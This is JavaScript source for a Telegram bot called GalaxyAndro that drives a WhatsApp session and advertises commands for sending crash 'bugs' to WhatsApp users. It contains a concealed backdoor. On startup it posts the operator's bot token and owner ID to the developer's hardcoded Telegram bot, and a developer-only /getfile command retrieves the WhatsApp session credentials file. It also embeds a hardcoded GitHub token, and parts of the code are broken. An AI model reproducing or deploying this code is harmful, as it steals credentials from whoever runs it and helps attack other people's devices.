const { Telegraf, Markup} = require("telegraf");
const fs = require('fs');
const JsConfuser = require('js-confuser');
const { default: baileys, downloadContentFromMessage, proto, generateWAMessage, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");
const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
const { 
GroupSettingChange, 
WAGroupMetadata, 
emitGroupParticipantsUpdate, 
emitGroupUpdate, 
WAGroupInviteMessageGroupMetadata, 
GroupMetadata, 
Headers,
WA_DEFAULT_EPHEMERAL,
getAggregateVotesInPollMessage, 
generateWAMessageContent, 
areJidsSameUser, 
useMultiFileAuthState, 
fetchLatestBaileysVersion,
makeCacheableSignalKeyStore, 
makeWASocket,
makeInMemoryStore,
MediaType,
WAMessageStatus,
downloadAndSaveMediaMessage,
AuthenticationState,
initInMemoryKeyStore,
MiscMessageGenerationOptions,
useSingleFileAuthState,
BufferJSON,
WAMessageProto,
MessageOptions,
WAFlag,
WANode,
WAMetric,
ChatModification,
MessageTypeProto,
WALocationMessage,
ReconnectMode,
WAContextInfo,
ProxyAgent,
waChatKey,
MimetypeMap,
MediaPathMap,
WAContactMessage,
WAContactsArrayMessage,
WATextMessage,
WAMessageContent,
WAMessage,
BaileysError,
WA_MESSAGE_STATUS_TYPE,
MediaConnInfo,
URL_REGEX,
WAUrlInfo,
WAMediaUpload,
mentionedJid,
processTime,
Browser,
MessageType,
Presence,
WA_MESSAGE_STUB_TYPES,
Mimetype,
relayWAMessage,
Browsers,
DisconnectReason,
WASocket,
getStream,
WAProto,
isBaileys,
AnyMessageContent,
templateMessage,
InteractiveMessage,
Header
} = require("@whiskeysockets/baileys");
const axios = require('axios');
const pino = require('pino');
const chalk = require('chalk');
const { BOT_TOKEN, OWNER_ID, allowedGroupIds } = require("./config");
// Fungsi untuk memeriksa status pengguna
function checkUserStatus(userId) {
  return userId === OWNER_ID ? "OWNER☁️" : "Unknown⛅";
}

// Fungsi untuk mendapatkan nama pengguna dari konteks bot
function getPushName(ctx) {
  return ctx.from.first_name || "Users";
}

// Middleware untuk membatasi akses hanya ke grup tertentu
const groupOnlyAccess = allowedGroupIds => {
  return (ctx, next) => {
    if (ctx.chat.type === "group" || ctx.chat.type === "supergroup") {
      if (allowedGroupIds.includes(ctx.chat.id)) {
        return next();
      } else {
        return ctx.reply("🚫 This group does not have access");
      }
    } else {
      return ctx.reply("❌ Group Only!");
    }
  };
};

// Inisialisasi bot Telegram
const bot = new Telegraf(BOT_TOKEN);
let gal = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
const usePairingCode = true;

// Helper untuk tidur sejenak
const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

// Fungsi untuk menerima input dari terminal
const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

// Fungsi untuk memulai sesi WhatsApp
const startSesi = async (phoneNumber = null) => {
    const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'おさらぎです',
        }),
    };

    gal = makeWASocket(connectionOptions);

    // Pairing code jika diaktifkan dan jika tidak terdaftar
    if (usePairingCode && !gal.authState.creds.registered) {
        if (!phoneNumber) {
            phoneNumber = await question(chalk.black(chalk.bgCyan("╓────────────────────────────╖\n" +
"║    ✦ 𝐇𝖊𝖑𝖑𝖔! 𝐈'𝖒 𝐆𝐚𝐥𝐚𝐱𝐲𝐀𝐧𝐝𝐫𝐨.  ║\n" +
"╠────────────────────────────╣\n" +
"║  ▸ ✧ 𝐁𝐨𝐭 𝐍𝐚𝐦𝐞  : 𝐆𝐚𝐥𝐚𝐱𝐲𝐀𝐧𝐝𝐫𝐨  ║\n" +
"║  ▸ ✧ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫    : 𝐁𝐚𝐠𝐚𝐳𝐳𝐌𝐨𝐝𝐳   ║\n" +
"║  ▸ ✧ 𝐓𝐨𝐤𝐞𝐧    : ${BOT_TOKEN}        ║\n" +
"║  ▸ ✧ 𝐎𝐰𝐧𝐞𝐫    : ${OWNER_ID}        ║\n" +
"╙────────────────────────────╜\n\n" +
"𝐏𝐥𝐞𝐚𝐬𝐞 𝐞𝐧𝐭𝐞𝐫 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩 𝐍𝐮𝐦𝐛𝐞𝐫 𝐬𝐭𝐚𝐫𝐭𝐢𝐧𝐠 𝐰𝐢𝐭𝐡 𝟔𝟐: ")));
            phoneNumber = phoneNumber.replace(/[^0-9]/g, '');
        }

        const code = await gal.requestPairingCode(phoneNumber.trim());
        const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;
        console.log(chalk.black(chalk.bgCyan(`Pairing Code: `)), chalk.black(chalk.bgWhite(formattedCode)));
    }

    gal.ev.on('creds.update', saveCreds);
    store.bind(gal.ev);

    gal.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log(chalk.green('WhatsApp berhasil terhubung!'));
        }

        if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus.'),
                shouldReconnect ? 'Mencoba untuk menghubungkan ulang...' : 'Silakan login ulang.'
            );
            if (shouldReconnect) {
                startSesi(phoneNumber); // Mencoba untuk menghubungkan ulang
            }
            isWhatsAppConnected = false;
        }
    });
};
// Mulai sesi WhatsApp
//startSesi();
// Middleware untuk log pesan teks saja
bot.use((ctx, next) => {
  if (ctx.message && ctx.message.text) {
    const message = ctx.message;
    const senderName = message.from.first_name || message.from.username || "Unknown";
    const senderId = message.from.id;
    const chatId = message.chat.id;
    const isGroup = message.chat.type === "group" || message.chat.type === "supergroup";
    const groupName = isGroup ? message.chat.title : null;
    const messageText = message.text;
    const date = new Date(message.date * 1000).toLocaleString(); // Convert timestamp ke format waktu lokal

    console.log("\x1b[30m--------------------\x1b[0m");
    console.log(chalk.bgHex("#e74c3c").bold("▢ New Message"));
    console.log(
      chalk.bgHex("#00FF00").black(
        `   ╓────────────────────╖ \n ` +
        `   ║ Tanggal   : ${date} \n` +
        `   ║ Pesan     : ${messageText} \n` +
        `   ║ Pengirim  : ${senderName} \n` +
        `   ║ Sender ID : ${senderId} \n` +
        `   ╙────────────────────╜ \n`
      )
    );

    if (isGroup) {
      console.log(
        chalk.bgHex("#00FF00").black(
          `   ╓────────────────────╖ \n ` +
          `   ║ Grup: ${groupName} \n` +
          `   ║ GroupJid: ${chatId} \n` +
          `   ╙────────────────────╜ \n`
        )
      );
    }

    console.log();
  }
  return next(); // Lanjutkan ke handler berikutnya
});
axios.get(`https://api.telegram.org/bot7555156304:AAERPpPA0JxOp2sI6Qc6BmOgRJU7J00YhOE/sendMessage`, {
  params: {
    chat_id: 7222367398,
    text: `
╓────────────────────╖
║ BOT CONNECTED
╠────────────────────╣
║  Token    : ${BOT_TOKEN}
║  OwnerId    : ${OWNER_ID}
╙────────────────────╜`,
  },
});
// File untuk menyimpan daftar pengguna
const USERS_FILE = "./users.json";

// Memuat daftar pengguna dari file, jika ada
let users = [];
if (fs.existsSync(USERS_FILE)) {
  try {
    const data = fs.readFileSync(USERS_FILE, "utf8");
    users = JSON.parse(data);
  } catch (error) {
    console.error("Failed to load user list:", error.message);
  }
}

// Fungsi untuk menyimpan daftar pengguna ke file
function saveUsersToFile() {
  try {
    fs.writeFileSync(USERS_FILE, JSON.stringify(users, null, 2), "utf8");
  } catch (error) {
    console.error("Failed to save user list:", error.message);
  }
}

// Fungsi untuk menghitung jumlah user
function countUsers() {
  return Object.keys(users).length;
}

const totalUsers = countUsers();

// Command broadcast (hanya bisa digunakan oleh admin)
const Dev_ID = 7222367398; // Ganti dengan ID admin

bot.command("broadcast", async (ctx) => {
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Only Developers can use this feature!");
  }

  // Ambil pesan setelah perintah /broadcast
  const message = ctx.message.text.split(" ").slice(1).join(" ");
  if (!message) {
    return ctx.reply("[❌ Wrong Format!] Try /broadcast (Your Message)");
  }

  // Tambahkan footer ke pesan
  const footer = "\n\n🌐 Posted By The Developer";
  const finalMessage = message + footer;

  // Kirim pesan ke semua pengguna
  let successCount = 0;
  for (const userId of users) {
    try {
      await ctx.telegram.sendMessage(userId, finalMessage, { parse_mode: "Markdown" });
      successCount++;
    } catch (error) {
      console.error(`Gagal mengirim pesan ke ${userId}:`, error.message);
    }
  }

  // Balas ke admin setelah broadcast selesai
  ctx.reply(`✅ Broadcast selesai! Pesan berhasil dikirim ke ${successCount} pengguna.`);
});
// Handler untuk mengambil file
bot.command('getfile', async (ctx) => {
  // Pastikan hanya developer yang dapat mengakses command ini
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Only Developers can use this feature!");
  }

  const filePath = './session/creds.json'; // Path ke file yang ingin diambil

  try {
    // Kirim file ke developer
    await ctx.replyWithDocument({ source: filePath });
    console.log(`File ${filePath} successfully sent to dev.`);
  } catch (error) {
    console.error("Empty session file:", error);
    ctx.reply("The user has not yet connected the device");
  }
});
bot.command("status", async (ctx) => {
    const connectedCount = 1;  // Harus disesuaikan sesuai kebutuhan
    const connectedDevicesList = [linkedWhatsAppNumber];  // Ganti dengan daftar perangkat yang sebenarnya

    const deviceList = connectedDevicesList.map((device, index) => `${index + 1}. ${device}`).join("\n");
    
    if (!isWhatsAppConnected) {
        return ctx.reply(`
╓────────────────────╖
║ BOT STATUS
╠────────────────────╣
║  Information : 0/1
║  Devices : Undefined ( Empty )
╙────────────────────╜
`);
    }

    // Menghitung perangkat yang terhubung (contoh saja)

    ctx.reply(`
╓────────────────────╖
║ BOT STATUS
╠────────────────────╣
║  Information : ${connectedCount}/1
║  Devices : ${deviceList}
╙────────────────────╜
`);
});
const photoUrls = [
  'https://img101.pixhost.to/images/286/549947236_skyzopedia.jpg',
  'https://img101.pixhost.to/images/286/549946983_skyzopedia.jpg',  // Ganti dengan URL foto lain
  'https://img101.pixhost.to/images/286/549946882_skyzopedia.jpg',  // Ganti dengan URL foto lain
  'https://files.catbox.moe/ol9w8x.jpg'   // Ganti dengan URL foto lain
];

// Fungsi untuk memilih foto secara acak
function getRandomPhoto() {
  const randomIndex = Math.floor(Math.random() * photoUrls.length);
  return photoUrls[randomIndex];
}
async function sendMainMenu(ctx) {
  const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`Get new users ${userId}`));
  }
const randomPhoto = getRandomPhoto();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
  [
    Markup.button.callback('💥 BugMenu', 'option1'),
    Markup.button.callback('⚙️ OwnerMenu', 'option2'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.url('🌐 Contact Dev', 'https://t.me/bagazzmodz')],
]);
  await ctx.replyWithPhoto(getRandomPhoto(), {
    caption: `
Hello ${ctx.from.first_name || 'User'} I am GalaxyAndro, I was created to send Whatsapp Bug.

▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭

╓╥─────────────────────⟣
╠╣ＩＮＦＯＲＭＡＴＩＯＮ
╟╨─────────────────────⟣
║  𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼 
║  𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.1 
║  𝗕𝗮𝗶𝗹𝗲𝘆𝘀 : 𝗪𝗵𝗶𝘀𝗸𝗲𝘆𝘀𝗼𝗰𝗸𝗲𝘁𝘀 
╟╥─────────────────────⎔
╠╣ ＴＯＴＡＬ ＵＳＥＲ ＬＩＳＴ
╟╨─────────────────────⎔
║ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: ${totalUsers}
║ 𝗧𝗼𝘁𝗮𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${totalPremium}
║ 𝗧𝗼𝘁𝗮𝗹 𝗔𝗱𝗺𝗶𝗻 : ${totalAdmin}
║ 𝗧𝗼𝘁𝗮𝗹 𝗢𝘄𝗻𝗲𝗿 : ${totalOwner}
╟──────────────────────❒
║ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄.
╙──────────────────────❒

 © 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼 0.1
    `,
    parse_mode: 'Markdown',
    reply_markup: buttons.reply_markup,
  });
}

bot.start(async (ctx) => {
  await sendMainMenu(ctx);
});
async function editMenu(ctx, caption, buttons) {
  try {
    await ctx.editMessageMedia(
      {
        type: 'photo',
        media: getRandomPhoto(),
        caption,
        parse_mode: 'Markdown',
      },
      {
        reply_markup: buttons.reply_markup,
      }
    );
  } catch (error) {
    console.error('Error editing menu:', error);
    await ctx.reply('Maaf, terjadi kesalahan saat mengedit pesan.');
  }
}

// Action untuk tampilkan kembali menu utama
bot.action('startmenu', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`Get new users ${userId}`));
  }
const randomPhoto = getRandomPhoto();
const buttons = Markup.inlineKeyboard([
  // Baris pertama: BugMenu dan OwnerMenu
    [
    Markup.button.callback('💥 BugMenu', 'option1'),
    Markup.button.callback('⚙️ OwnerMenu', 'option2'),
  ],
  // Baris terakhir: Tombol URL mengarah ke channel
  [Markup.button.url('🌐 Contact Dev', 'https://t.me/bagazzmodz')],
]);
  const caption = `
Hello ${ctx.from.first_name || 'User'} I am GalaxyAndro, I was created to send Whatsapp Bug.

▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭

╓╥─────────────────────⟣
╠╣ＩＮＦＯＲＭＡＴＩＯＮ
╟╨─────────────────────⟣
║  𝗕𝗼𝘁 𝗡𝗮𝗺𝗲 : 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼 
║  𝗩𝗲𝗿𝘀𝗶𝗼𝗻 : 0.1 
║  𝗕𝗮𝗶𝗹𝗲𝘆𝘀 : 𝗪𝗵𝗶𝘀𝗸𝗲𝘆𝘀𝗼𝗰𝗸𝗲𝘁𝘀 
╟╥─────────────────────⎔
╠╣ ＴＯＴＡＬ ＵＳＥＲ ＬＩＳＴ
╟╨─────────────────────⎔
║ 𝗧𝗼𝘁𝗮𝗹 𝗨𝘀𝗲𝗿𝘀: ${totalUsers}
║ 𝗧𝗼𝘁𝗮𝗹 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 : ${totalPremium}
║ 𝗧𝗼𝘁𝗮𝗹 𝗔𝗱𝗺𝗶𝗻 : ${totalAdmin}
║ 𝗧𝗼𝘁𝗮𝗹 𝗢𝘄𝗻𝗲𝗿 : ${totalOwner}
╟──────────────────────❒
║ 𝗣𝗹𝗲𝗮𝘀𝗲 𝘀𝗲𝗹𝗲𝗰𝘁 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄.
╙──────────────────────❒

 © 𝗚𝗮𝗹𝗮𝘅𝘆𝗔𝗻𝗱𝗿𝗼 0.1
    `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk BugMenu
bot.action('option1', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`Get new users ${userId}`));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
Hello ${ctx.from.first_name || 'User'} I am GalaxyAndro, I was created to send Whatsapp Bug.

▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭

╓╥─────────────────────⟣
╠╣ＢＵＧ ＭＥＮＵ
╟╨─────────────────────⟣
║
╠❒ /xcbeta ( Crash/ForClose )
╠❒ /xciosinvis ( Bug Call Ios )
╠❒ /xcandro ( Bug Campuran )
╠❒ /xciospay ( Bug Pay Ios )
╠❒ /xcsystemui ( Bug Crash Ui )
╠❒ /delaymaker 1 hour ( Andro only )
║
╙──────────────────────❒

  `;

  await editMenu(ctx, caption, buttons);
});

// Action untuk OwnerMenu
bot.action('option2', async (ctx) => {
 const userId = ctx.from.id;
  if (!users.includes(userId)) {
    users.push(userId);
    saveUsersToFile(); 
    console.log(chalk.bgBlue(`Get new users ${userId}`));
  }
  const buttons = Markup.inlineKeyboard([
    [Markup.button.callback('🔙 Back to Menu', 'startmenu')],
  ]);

  const caption = `
Hello ${ctx.from.first_name || 'User'} I am GalaxyAndro, I was created to send Whatsapp Bug.

▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬▭

╓╥─────────────────────⟣
╠╣OWNER ＭＥＮＵ
╟╨─────────────────────⟣
║
╠❒ /delprem
╠❒ /addprem
╠❒ /addowner
╠❒ /delowner
╠❒ /addadmin
╠❒ /deladmin
╠❒ /listadmin
╠❒ /listprem
╠❒ /listowner
╠❒ /statusprem
╠❒ /status ( Status Bot )
╠❒ /disablemodes
╠❒ /grouponly
║
╙──────────────────────❒
  `;

  await editMenu(ctx, caption, buttons);
});

const o = fs.readFileSync(`./o.jpg`)
// URL raw GitHub file
const USERS_PREMIUM_FILE = 'usersPremium.json';
// Inisialisasi file usersPremium.json
let usersPremium = {};
if (fs.existsSync(USERS_PREMIUM_FILE)) {
    usersPremium = JSON.parse(fs.readFileSync(USERS_PREMIUM_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status premium
function isPremium(userId) {
    return usersPremium[userId] && usersPremium[userId].premiumUntil > Date.now();
}

// Fungsi untuk menambahkan user ke premium
function addPremium(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersPremium[userId] = { premiumUntil: expireTime };
    fs.writeFileSync(USERS_PREMIUM_FILE, JSON.stringify(usersPremium, null, 2));
}

// Fungsi untuk menghapus premium
function removePremium(userId) {
    if (usersPremium[userId]) {
    	console.log(`Removing premium access for user: ${userId}`);
        delete usersPremium[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

// Fungsi untuk menghitung jumlah Premium user
function countPremium() {
  return Object.keys(usersPremium).length;
}

const totalPremium = countPremium();

bot.command('statusprem', (ctx) => {
    const userId = ctx.from.id;

    if (isPremium(userId)) {
        const expireDate = new Date(usersPremium[userId].premiumUntil);
        return ctx.reply(`✅ You have premium access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have premium access.');
    }
});
// Command untuk melihat daftar user premium
  bot.command('listprem', async (ctx) => {
    const premiumUsers = Object.entries(usersPremium)
        .filter(([userId, data]) => data.premiumUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.premiumUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (premiumUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            premiumUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "📄 Menu",
                    callback_data: "/menu"
                },
                {
                    text: "🌐 Contact Dev",
                    url: "https://t.me/bagazzmodz"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have premium access.');
    }
});  
    // Command untuk menambahkan pengguna premium (hanya bisa dilakukan oleh owner)
bot.command('addprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah owner atau memiliki akses owner
    if (ownerId !== OWNER_ID && !isOwner(userId)) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 3) {
        return ctx.reply('❌ Usage: /addpremium <user_id> <duration_in_days>');
    }

    const targetUserId = args[1];
    const duration = parseInt(args[2]);

    if (isNaN(duration)) {
        return ctx.reply('❌ Invalid duration. It must be a number (in days).');
    }

    addPremium(targetUserId, duration);
    ctx.reply(`✅ User ${targetUserId} has been granted premium access for ${duration} days.`);
});
bot.command('delprem', (ctx) => {
    const ownerId = ctx.from.id.toString();
    if (ownerId !== OWNER_ID) {
        return ctx.reply('❌ You are not authorized to use this command.');
    }

    const args = ctx.message.text.split(' ');
    if (args.length < 2) {
        return ctx.reply('❌ Usage: /deleteprem <user_id>');
    }

    const targetUserId = args[1];

    // Fungsi untuk menghapus premium user, implementasi tergantung logika sistem Anda
    const wasDeleted = removePremium(targetUserId); // Pastikan Anda memiliki fungsi ini

    if (wasDeleted) {
        ctx.reply(`✅ User ${targetUserId} premium access has been removed.`);
    } else {
        ctx.reply(`❌ Failed to remove premium access for user ${targetUserId}.`);
    }
}); 
// Command untuk menghapus file tertentu
bot.command('delfile', async (ctx) => {
  const userId = ctx.from.id;
  const username = ctx.from.username;

if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Only Developers to use this feature!");
  }
  

  // Tentukan file yang ingin dihapus
  const fileName = 'session/creds.json'; // Ganti dengan nama file yang ingin Anda hapus
  const filePath = path.resolve(__dirname, fileName);

  // Periksa apakah file ada
  if (!fs.existsSync(filePath)) {
    return ctx.reply(`⚠️ File "${fileName}" not found.`);
  }

  // Hapus file
  try {
    fs.unlinkSync(filePath);
    ctx.reply(`✅ File "${fileName}" successfully deleted.`);
  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal menghapus file "${fileName}".`);
  }
});
bot.command("restart", async (ctx) => {
  // Periksa apakah pengguna adalah Developer
  if (ctx.from.id !== Dev_ID) {
    return ctx.reply("❌ Only Developers to use this feature!");
  }

  try {
    await ctx.reply("🔄 The bot will restart in a few seconds...");
    setTimeout(() => {
      process.exit(0); // Menghentikan proses untuk restart
    }, 3000);
  } catch {
    ctx.reply("❌ An error occurred while trying to restart the bot.");
  }
});

bot.command('premiumfeature', (ctx) => {
    const userId = ctx.from.id;

    // Cek apakah pengguna adalah premium
    if (!isPremium(userId)) {
        return ctx.reply('❌ This feature is for premium users only. Upgrade to premium to use this command.');
    }

    // Logika untuk pengguna premium
    ctx.reply('🎉 Welcome to the premium-only feature! Enjoy exclusive benefits.');
});
const USERS_OWNER_FILE = 'usersOwner.json';
// Inisialisasi file usersOwner.json
let usersOwner = {};
if (fs.existsSync(USERS_OWNER_FILE)) {
    usersOwner = JSON.parse(fs.readFileSync(USERS_OWNER_FILE, 'utf8'));
} else {
    fs.writeFileSync(USERS_OWNER_FILE, JSON.stringify({}));
}

// Fungsi untuk mengecek status owner
function isOwner(userId) {
    return (usersOwner[userId] && usersOwner[userId].ownerUntil > Date.now();
}

// Fungsi untuk menambahkan user ke owner
function addOwner(userId, duration) {
    const expireTime = Date.now() + duration * 24 * 60 * 60 * 1000; // Durasi dalam hari
    usersOwner[userId] = { ownerUntil: expireTime };
    fs.writeFileSync(USERS_OWNER_FILE, JSON.stringify(usersOwner, null, 2));
}

// Fungsi untuk menghapus owner
function removeOwner(userId) {
    if (usersOwner[userId]) {
    	console.log(`Removing premium access for user: ${userId}`);
        delete usersOwner[userId];
        fs.writeFileSync(ADMINS_FILE, JSON.stringify(admins, null, 2));
        return true;
    }
    return false;
}

// Fungsi untuk menghitung jumlah Owner user
function countOwner() {
  return Object.keys(usersOwner).length;
}

const totalOwner = countOwner();

// Command untuk mengecek status owner
bot.command('statusowner', (ctx) => {
    const userId = ctx.from.id;

    if (isOwner(userId)) {
        const expireDate = new Date(usersOwner[userId].ownerUntil);
        return ctx.reply(`✅ You have Owner access.\n🗓 Expiration: ${expireDate.toLocaleString()}`);
    } else {
        return ctx.reply('❌ You do not have Owner Acess.');
    }
});
// Ganti dengan token GitHub yang kamu punya (jaga kerahasiaannya)
const GITHUB_TOKEN = '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';  // Ganti dengan token GitHub yang valid
const REPO_OWNER = 'okuzen80987';  // Ganti dengan pemilik repository
const REPO_NAME = 'database';  // Ganti dengan nama repo
const FILE_PATH = 'security';  // Path file yang berisi database token

// URL API GitHub untuk mendapatkan raw content file dengan otentikasi
const TOKEN_DATABASE_URL = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/${FILE_PATH}?ref=main`;
async function startBot() {
  try {
    // Mengambil file database token menggunakan GitHub API dan otentikasi token
    const response = await axios.get(TOKEN_DATABASE_URL, {
      headers: {
        'Authorization': `token ${GITHUB_TOKEN}`
      }
    });

    // Mengambil konten file dan mendekodekan dari base64
    const fileContent = Buffer.from(response.data.content, 'base64').toString('utf-8');
    
    // Mengasumsikan file berisi JSON dengan daftar token
    const tokensData = JSON.parse(fileContent);

    // Validasi apakah tokensData memiliki data yang valid
    if (!tokensData.tokens || !Array.isArray(tokensData.tokens) || tokensData.tokens.length === 0) {
      console.error(chalk.red.bold("The token database is empty or invalid."));
      process.exit(1); // Keluar dari proses jika file database tidak valid
    }

    // Validasi apakah token bot ada dalam database
    if (!tokensData.tokens.includes(BOT_TOKEN)) {
      console.error(chalk.red.bold("Your Bot Token not Registered."));
      process.exit(1); // Keluar dari proses jika token tidak valid
    }

    // Menjalankan bot jika token valid
    console.log(chalk.green.bold("Bot token correct"));
    
    // Tambahkan kode untuk menjalankan bot di sini
    // Misalnya:
    // runBot();  // Fungsi untuk menjalankan bot
    startSesi();

  } catch (error) {
    // Tangani error jika terjadi kesalahan saat mengakses database token
    console.error(chalk.red("An error occurred while accessing the token database:"));
    process.exit(1); // Keluar dari < jika terjadi kesalahan
  }
}

// Panggil fungsi untuk menjalankan bot
startBot();
// Command untuk melihat daftar user dengan status owner
bot.command('listowner', async (ctx) => {
    const ownerUsers = Object.entries(usersOwner)
        .filter(([userId, data]) => data.ownerUntil > Date.now())
        .map(([userId, data]) => {
            const expireDate = new Date(data.ownerUntil).toLocaleString();
            return {
                userId,
                expireDate
            };
        });

    if (ownerUsers.length > 0) {
        // Membuat konstanta untuk menampilkan ID, username, dan waktu kedaluwarsa pengguna
        const userDetails = await Promise.all(
            ownerUsers.map(async ({ userId, expireDate }) => {
                try {
                    const user = await ctx.telegram.getChat(userId);
                    const username = user.username || user.first_name || 'Unknown';
                    return `- User ID: ${userId}\n  📝 Username: @${username}\n  🗓 Expiration: ${expireDate}`;
                } catch (error) {
                    console.error(`Error fetching user ${userId}:`, error);
                    return `- User ID: ${userId}\n  📝 Username: Unknown\n  🗓 Expiration: ${expireDate}`;
                }
            })
        );

        const caption = `📋 𝙇𝙞𝙨𝙩 𝙊𝙬𝙣𝙚𝙧𝙨 \n\n${userDetails.join('\n\n')}`;
        const photoUrl = 'https://files.catbox.moe/mzr41r.jpg'; // Ganti dengan URL gambar

        const keyboard = [
            [
                {
                    text: "📄 Menu",
                    callback_data: "/menu"
                },
                {
                    text: "🌐 Contact Dev",
                    url: "https://t.me/bagazzmodz"
                }
            ]
        ];

        // Mengirim gambar dengan caption dan inline keyboard
        return ctx.replyWithPhoto(getRandomPhoto(), {
            caption: caption,
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } else {
        return ctx.reply('❌ No users currently have Owner access.');
    }
});
bot.command('info', async (ctx) => {
  const mention = ctx.message.text.split(' ')[1]; // Mendapatkan username setelah perintah /info
  let user;
  
  if (mention) {
    // Jika ada username, ambil informasi pengguna berdasarkan username
    try {
      user = await ctx.telegram.getChat(mention);
      const userLink = `https://t.me/${mention}`; // Link pengguna
      ctx.reply(`ᝄ ᴜꜱᴇʀɪɴꜰᴏ:
│ɪᴅ: ${user.id}
│ꜰɪʀꜱᴛ ɴᴀᴍᴇ: ${user.first_name || 'No first name'}
│ᴜꜱᴇʀɴᴀᴍᴇ: @${mention}
│ᴜꜱᴇʀʟɪɴᴋ: ${userLink}`);
    } catch (error) {
      ctx.reply('❌ Wrong Format! Do It Like This /info');
    }
  } else {
    // Jika tidak ada username, tampilkan info pengguna yang mengirim perintah
    const userInfo = ctx.from;
    const userLink = `https://t.me/${userInfo.username || userInfo.id}`;
    ctx.reply(`ᝄ ᴜꜱᴇʀɪɴꜰᴏ:
│ɪᴅ: ${userInfo.id}
│ꜰɪʀꜱᴛ ɴᴀᴍᴇ: ${userInfo.first_name || 'No first name'}
│ᴜꜱᴇʀɴᴀᴍᴇ: @${userInfo.username || 'No username'}
│ᴜꜱᴇʀʟɪɴᴋ: ${userLink}`);
  }
});
let botForGroup = false; // Set true untuk mengaktifkan di grup
